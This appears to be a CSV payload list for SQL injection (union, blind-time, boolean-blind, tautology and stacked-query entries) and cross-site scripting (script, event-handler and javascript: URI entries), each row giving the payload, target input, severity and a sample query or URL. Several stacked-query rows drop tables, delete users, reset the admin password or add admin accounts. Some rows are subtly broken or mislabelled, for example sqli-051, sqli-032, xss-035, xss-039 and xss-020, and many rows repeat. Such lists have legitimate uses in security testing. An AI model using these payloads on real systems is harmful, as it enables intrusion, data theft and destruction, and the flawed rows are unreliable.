id,description,payload,context,type,severity,example_query,example_usage
sqli-026,Using UNION SELECT with database() function,"' UNION SELECT database(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--",
sqli-027,Using OR with sleep for time delay in SQL Server,'; WAITFOR DELAY '0:0:10'--,User ID input,blind-time,medium,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:10'--,
sqli-028,Using OR with cast to bypass filters,' OR CAST(1 AS INT)=1--,Login form,tautology,medium,SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1--,
sqli-029,Using OR with substring for blind boolean injection,"' OR SUBSTRING(user(),1,1)='r'--",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='r'--",
sqli-030,Using OR with sleep for time delay in Oracle,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,User input,blind-time,medium,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,
sqli-031,Using UNION SELECT with information_schema.tables,"' UNION SELECT table_name, NULL FROM information_schema.tables--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT table_name, NULL FROM information_schema.tables--",
sqli-032,Using OR with sleep for time delay in SQLite,' OR (SELECT sleep(5))--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR (SELECT sleep(5))--,
sqli-033,Using OR with hex encoded string,' OR 0x61646d696e=0x61646d696e--,Login username,tautology,medium,SELECT * FROM users WHERE username = '' OR 0x61646d696e=0x61646d696e--,
sqli-034,Using OR with sleep for time delay in MySQL with comment,' OR SLEEP(5)#,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(5)#,
sqli-035,Using UNION SELECT with user() function,"' UNION SELECT user(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--",
sqli-036,Using OR with sleep for time delay in PostgreSQL with comment,' OR pg_sleep(3)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(3)--,
sqli-037,Using OR with sleep for time delay in SQL Server with comment,'; WAITFOR DELAY '0:0:3'--,User ID input,blind-time,medium,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:3'--,
sqli-038,Using OR with substring for blind boolean injection with comment,"' OR SUBSTRING(@@version,1,1)='5'--",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='5'--",
sqli-039,Using OR with sleep for time delay in Oracle with comment,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,User input,blind-time,medium,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--,
sqli-041,Using OR with sleep for time delay in MySQL with inline comment,' OR SLEEP(8)/*,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(8)/*,
sqli-042,Using UNION SELECT to extract table names,"' UNION SELECT table_name, NULL FROM information_schema.tables--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT table_name, NULL FROM information_schema.tables--",
sqli-043,Using OR with substring for blind boolean injection with inline comment,"' OR SUBSTRING(user(),1,1)='a'/*",Login input,boolean-blind,medium,"SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='a'/*",
sqli-044,Using stacked queries to update data,'; UPDATE users SET password='hacked' WHERE username='admin'--,User input,stacked-queries,critical,SELECT * FROM users WHERE username = ''; UPDATE users SET password='hacked' WHERE username='admin'--,
sqli-045,Using OR with sleep for time delay in PostgreSQL with inline comment,' OR pg_sleep(6)/*,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(6)/*,
sqli-046,Using UNION SELECT to extract column names,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
sqli-047,Using OR with cast for tautology,' OR CAST('1' AS INT)=1--,Login form,tautology,medium,SELECT * FROM users WHERE username = '' OR CAST('1' AS INT)=1--,
sqli-048,Using OR with sleep for time delay in SQL Server with inline comment,'; WAITFOR DELAY '0:0:7'/*,User ID input,blind-time,medium,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:7'/*,
sqli-049,Using OR with substring for blind boolean injection with hash comment,"' OR SUBSTRING(@@version,1,1)='8'#",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='8'#",
sqli-050,Using UNION SELECT to extract user(),"' UNION SELECT user(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--",
sqli-051,Using OR with sleep for time delay in Oracle with inline comment,' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,User input,blind-time,medium,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/,
sqli-052,Using stacked queries to delete data,'; DELETE FROM users WHERE username='guest'--,User input,stacked-queries,critical,SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='guest'--,
sqli-053,Using OR with hex encoded tautology,' OR 0x31=0x31--,Login username,tautology,medium,SELECT * FROM users WHERE username = '' OR 0x31=0x31--,
sqli-054,Using OR with sleep for time delay in MySQL with hash comment,' OR SLEEP(9)#,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(9)#,
sqli-055,Using UNION SELECT to extract schema names,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
sqli-056,Using OR with sleep for time delay in PostgreSQL with hash comment,' OR pg_sleep(4)#,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(4)#,
sqli-057,Using OR with cast for tautology with inline comment,' OR CAST(1 AS INT)=1/*,Login form,tautology,medium,SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1/*,
sqli-058,Using OR with substring for blind boolean injection with inline comment,"' OR SUBSTRING(user(),1,1)='b'/*",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='b'/*",
sqli-059,Using UNION SELECT to extract current database,"' UNION SELECT database(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--",
sqli-060,Using stacked queries to create new user,"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",User input,stacked-queries,critical,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",
sqli-061,Using OR with sleep for time delay in SQL Server with hash comment,'; WAITFOR DELAY '0:0:5'#,User ID input,blind-time,medium,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:5'#,
sqli-062,Using OR with substring for blind boolean injection with hash comment,"' OR SUBSTRING(@@version,1,1)='9'#",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='9'#",
sqli-063,Using UNION SELECT to extract user privileges,"' UNION SELECT user(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--",
sqli-064,Using OR with sleep for time delay in Oracle with hash comment,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,User input,blind-time,medium,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#,
sqli-065,Using stacked queries to drop table,'; DROP TABLE sessions--,User input,stacked-queries,critical,SELECT * FROM users WHERE username = ''; DROP TABLE sessions--,
sqli-066,Using OR with hex encoded tautology with comment,' OR 0x41=0x41--,Login username,tautology,medium,SELECT * FROM users WHERE username = '' OR 0x41=0x41--,
sqli-067,Using OR with sleep for time delay in MySQL with double dash comment,' OR SLEEP(11)--,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(11)--,
sqli-068,Using UNION SELECT to extract schema names with comment,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
sqli-069,Using OR with sleep for time delay in PostgreSQL with double dash comment,' OR pg_sleep(12)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(12)--,
sqli-071,Using OR with sleep for time delay in MySQL with double dash comment,' OR SLEEP(12)--,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(12)--,
sqli-072,Using UNION SELECT to extract column names with comment,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",
sqli-073,Using OR with substring for blind boolean injection with double dash comment,"' OR SUBSTRING(user(),1,1)='c'--",Login input,boolean-blind,medium,"SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='c'--",
sqli-074,Using stacked queries to insert admin user,"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",User input,stacked-queries,critical,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",
sqli-075,Using OR with sleep for time delay in PostgreSQL with double dash comment,' OR pg_sleep(8)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(8)--,
sqli-076,Using UNION SELECT to extract database version,"' UNION SELECT @@version, NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT @@version, NULL--",
sqli-077,Using OR with cast for tautology with double dash comment,' OR CAST('1' AS INT)=1--,Login form,tautology,medium,SELECT * FROM users WHERE username = '' OR CAST('1' AS INT)=1--,
sqli-078,Using OR with sleep for time delay in SQL Server with double dash comment,'; WAITFOR DELAY '0:0:8'--,User ID input,blind-time,medium,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:8'--,
sqli-079,Using OR with substring for blind boolean injection with double dash comment,"' OR SUBSTRING(@@version,1,1)='7'--",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='7'--",
sqli-080,Using UNION SELECT to extract current user,"' UNION SELECT user(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--",
sqli-081,Using OR with sleep for time delay in Oracle with double dash comment,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--,User input,blind-time,medium,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--,
sqli-082,Using stacked queries to delete admin user,'; DELETE FROM users WHERE username='admin'--,User input,stacked-queries,critical,SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='admin'--,
sqli-083,Using OR with hex encoded tautology with double dash comment,' OR 0x42=0x42--,Login username,tautology,medium,SELECT * FROM users WHERE username = '' OR 0x42=0x42--,
sqli-084,Using OR with sleep for time delay in MySQL with double dash comment,' OR SLEEP(13)--,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(13)--,
sqli-085,Using UNION SELECT to extract schema names with double dash comment,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
sqli-086,Using OR with sleep for time delay in PostgreSQL with double dash comment,' OR pg_sleep(14)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(14)--,
sqli-087,Using OR with cast for tautology with double dash comment,' OR CAST(1 AS INT)=1--,Login form,tautology,medium,SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1--,
sqli-088,Using OR with substring for blind boolean injection with double dash comment,"' OR SUBSTRING(user(),1,1)='d'--",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='d'--",
sqli-089,Using UNION SELECT to extract current database with double dash comment,"' UNION SELECT database(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--",
sqli-090,Using stacked queries to create new admin user,"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",User input,stacked-queries,critical,"SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",
sqli-091,Using OR with sleepfor time delay in SQL Server with double dash comment,'; WAITFOR DELAY '0:0:9'--,User ID input,blind-time,medium,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:9'--,
sqli-092,Using OR with substring for blind boolean injection with double dash comment,"' OR SUBSTRING(@@version,1,1)='6'--",Search input,boolean-blind,medium,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='6'--",
sqli-093,Using UNION SELECT to extract user privileges with double dash comment,"' UNION SELECT user(), NULL--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--",
sqli-094,Using OR with sleep for time delay in Oracle with double dash comment,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--,User input,blind-time,medium,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--,
sqli-095,Using stacked queries to drop sessions table,'; DROP TABLE sessions--,User input,stacked-queries,critical,SELECT * FROM users WHERE username = ''; DROP TABLE sessions--,
sqli-096,Using OR with hex encoded tautology with double dash comment,' OR 0x43=0x43--,Login username,tautology,medium,SELECT * FROM users WHERE username = '' OR 0x43=0x43--,
sqli-097,Using OR with sleep for time delay in MySQL with double dash comment,' OR SLEEP(14)--,Search input,blind-time,medium,SELECT * FROM products WHERE name = '' OR SLEEP(14)--,
sqli-098,Using UNION SELECT to extract schema names with double dash comment,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--",Search input,union,high,"SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
sqli-099,Using OR with sleep for time delay in PostgreSQL with double dash comment,' OR pg_sleep(15)--,ID parameter,blind-time,medium,SELECT * FROM orders WHERE id = '' OR pg_sleep(15)--,
xss-001,Basic reflected XSS with script tag,<script>alert('XSS1')</script>,URL parameter,reflected,high,,http://example.com/search?q=<script>alert('XSS1')</script>
xss-002,Reflected XSS with image tag and onerror event,<img src=x onerror=alert('XSS2')>,URL parameter,reflected,high,,http://example.com/search?q=<img src=x onerror=alert('XSS2')>
xss-003,Stored XSS with script tag in comment field,<script>alert('XSS3')</script>,Comment input,stored,high,,Submitting comment: <script>alert('XSS3')</script>
xss-004,Reflected XSS with javascript: URI in anchor tag,"<a href='javascript:alert(""XSS4"")'>click</a>",URL parameter,reflected,high,,"http://example.com/page?link=<a href='javascript:alert(""XSS4"")'>click</a>"
xss-005,Reflected XSS with input tag and onfocus event,<input autofocus onfocus=alert('XSS5')>,URL parameter,reflected,high,,http://example.com/search?q=<input autofocus onfocus=alert('XSS5')>
xss-006,Stored XSS with iframe tag,"<iframe src='javascript:alert(""XSS6"")'></iframe>",User profile bio,stored,high,,"User bio: <iframe src='javascript:alert(""XSS6"")'></iframe>"
xss-007,Reflected XSS with SVG and onload event,<svg onload=alert('XSS7')>,URL parameter,reflected,high,,http://example.com/search?q=<svg onload=alert('XSS7')>
xss-008,Reflected XSS with body tag and onload event,<body onload=alert('XSS8')>,URL parameter,reflected,high,,http://example.com/page?param=<body onload=alert('XSS8')>
xss-009,Stored XSS with event handler in div tag,<div onclick=alert('XSS9')>Click me</div>,User input field,stored,high,,User input: <div onclick=alert('XSS9')>Click me</div>
xss-010,Reflected XSS with meta refresh tag,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>",URL parameter,reflected,high,,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>"
xss-011,Reflected XSS with style tag and expression,"<style>body{background:url(""javascript:alert('XSS11')"")}</style>",URL parameter,reflected,high,,"http://example.com/page?param=<style>body{background:url(""javascript:alert('XSS11')"")}</style>"
xss-012,Reflected XSS with script tag and encoded payload,%3Cscript%3Ealert('XSS12')%3C/script%3E,URL parameter,reflected,high,,http://example.com/search?q=%3Cscript%3Ealert('XSS12')%3C/script%3E
xss-013,Stored XSS with onmouseover event in span tag,<span onmouseover=alert('XSS13')>Hover me</span>,User input field,stored,high,,User input: <span onmouseover=alert('XSS13')>Hover me</span>
xss-014,Reflected XSS with iframe and srcdoc attribute,"<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>",URL parameter,reflected,high,,"http://example.com/page?param=<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>"
xss-015,Reflected XSS with object tag and data attribute,"<object data='javascript:alert(""XSS15"")'></object>",URL parameter,reflected,high,,"http://example.com/page?param=<object data='javascript:alert(""XSS15"")'></object>"
xss-016,Stored XSS with form tag and onsubmit event,<form onsubmit=alert('XSS16')><input type='submit'></form>,User input field,stored,high,,User input: <form onsubmit=alert('XSS16')><input type='submit'></form>
xss-017,Reflected XSS with video tag and onerror event,<video src=x onerror=alert('XSS17')></video>,URL parameter,reflected,high,,http://example.com/page?param=<video src=x onerror=alert('XSS17')></video>
xss-018,Reflected XSS with audio tag and onerror event,<audio src=x onerror=alert('XSS18')></audio>,URL parameter,reflected,high,,http://example.com/page?param=<audio src=x onerror=alert('XSS18')></audio>
xss-019,Stored XSS with textarea and onfocus event,<textarea onfocus=alert('XSS19')>Focus me</textarea>,User input field,stored,high,,User input: <textarea onfocus=alert('XSS19')>Focus me</textarea>
xss-020,Reflected XSS with math tag and href attribute,"<math href='javascript:alert(""XSS20"")'>X</math>",URL parameter,reflected,high,,"http://example.com/page?param=<math href='javascript:alert(""X20"")'>X</math>"
xss-021,Reflected XSS with base tag and href attribute,"<base href=""javascript:alert('XSS21');//"">",URL parameter,reflected,high,,"http://example.com/page?param=<base href=""javascript:alert('XSS21');//"">"
xss-022,Stored XSS with anchor tag and onclick event,"<a href='#' onclick='alert(""XSS22"")'>Click me</a>",User input field,stored,high,,"User input: <a href='#' onclick='alert(""XSS22"")'>Click me</a>"
xss-023,Reflected XSS with meta tag and content attribute,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>",URL parameter,reflected,high,,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>"
xss-024,Stored XSS with button tag and onclick event,"<button onclick='alert(""XSS24"")'>Click</button>",User input field,stored,high,,"User input: <button onclick='alert(""XSS24"")'>Click</button>"
xss-025,Reflected XSS with form tag and onreset event,<form onreset=alert('XSS25')><input type='reset'></form>,URL parameter,reflected,high,,http://example.com/page?param=<form onreset=alert('XSS25')><input type='reset'></form>
xss-026,Stored XSS with marquee tag and onstart event,<marquee onstart=alert('XSS26')>Scrolling text</marquee>,User input field,stored,high,,User input: <marquee onstart=alert('XSS26')>Scrolling text</marquee>
xss-027,Reflected XSS with embed tag and src attribute,"<embed src='javascript:alert(""XSS27"")'>",URL parameter,reflected,high,,"http://example.com/page?param=<embed src='javascript:alert(""XSS27"")'>"
xss-028,Stored XSS with bgsound tag and src attribute,"<bgsound src='javascript:alert(""XSS28"")'>",User input field,stored,high,,"User input: <bgsound src='javascript:alert(""XSS28"")'>"
xss-029,Reflected XSS with xml tag and onload event,<xml onload=alert('XSS29')>,URL parameter,reflected,high,,http://example.com/page?param=<xml onload=alert('XSS29')>
xss-031,Reflected XSS using SVG with animate element and begin attribute,<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>,URL parameter,reflected,high,,http://example.com/page?param=<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>
xss-032,Stored XSS using JavaScript URI in base tag,"<base href=""javascript:alert('XSS32');//"">",User profile input,stored,high,,"User profile: <base href=""javascript:alert('XSS32');//"">"
xss-033,Reflected XSS using malformed iframe with srcdoc and encoded script,<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>,URL parameter,reflected,high,,http://example.com/page?param=<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>
xss-034,Stored XSS using onpointerover event in div,"<div onpointerover='alert(""XSS34"")'>Hover me</div>",User input field,stored,high,,"User input: <div onpointerover='alert(""XSS34"")'>Hover me</div>"
xss-035,Reflected XSS using malformed script tag with backticks,<script>alert(XSS35)</script>,URL parameter,reflected,high,,http://example.com/page?param=<script>alert(XSS35)</script>
xss-036,Stored XSS using SVG foreignObject with embedded HTML and script,<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>,User input field,stored,high,,User input: <svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>
xss-037,Reflected XSS using onanimationstart event in div,"<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>",URL parameter,reflected,high,,"http://example.com/page?param=<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>"
xss-038,Stored XSS using input tag with oninput event,"<input oninput='alert(""XSS38"")'>",User input field,stored,high,,"User input: <input oninput='alert(""XSS38"")'>"
xss-039,Reflected XSS using malformed script with template literals,<script>eval(alert('XSS39'))</script>,URL parameter,reflected,high,,http://example.com/page?param=<script>eval(alert('XSS39'))</script>
xss-040,Stored XSS using object tag with data URI,"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>",User input field,stored,high,,"User input: <object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>"
xss-041,Reflected XSS using onpointerdown event in span,"<span onpointerdown='alert(""XSS41"")'>Click me</span>",URL parameter,reflected,high,,"http://example.com/page?param=<span onpointerdown='alert(""XSS41"")'>Click me</span>"
xss-042,Stored XSS using math tag with href attribute and javascript URI,"<math href='javascript:alert(""XSS42"")'>X</math>",User input field,stored,high,,"User input: <math href='javascript:alert(""XSS42"")'>X</math>"
xss-043,Reflected XSS using iframe with sandbox attribute bypass,"<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>",URL parameter,reflected,high,,"http://example.com/page?param=<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>"
xss-044,Stored XSS using video tag with oncanplay event,"<video oncanplay='alert(""XSS44"")'></video>",User input field,stored,high,,"User input: <video oncanplay='alert(""XSS44"")'></video>"
xss-045,Reflected XSS using meta tag with refresh and encoded javascript URI,"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>",URL parameter,reflected,high,,"http://example.com/page?param=<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>"
xss-046,Stored XSS using svg with set attribute and onbegin event,"<svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>",User input field,stored,high,,"User input: <svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>"
